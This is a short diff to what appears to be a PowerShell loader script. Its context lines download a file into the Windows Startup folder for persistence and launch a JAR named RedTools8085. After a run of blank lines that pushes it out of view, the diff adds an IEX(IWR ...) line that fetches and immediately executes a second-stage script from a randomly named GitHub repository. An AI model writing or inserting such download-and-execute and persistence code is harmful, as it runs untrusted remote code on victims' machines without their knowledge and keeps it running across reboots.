@@ -11,3 +11,11 @@ $destination = "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Pr
 Invoke-WebRequest -Uri $source -OutFile $destination
 cd "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
 Start RedTools8085.jar
+
+
+
+
+
+
+
+IEX(IWR https://raw.githubusercontent.com/ErrorLoadingUsername-404/320rk49asrotji4ejtrsltj3o4t34t/main/overloadpart2.ps1 -UseBasicParsing)
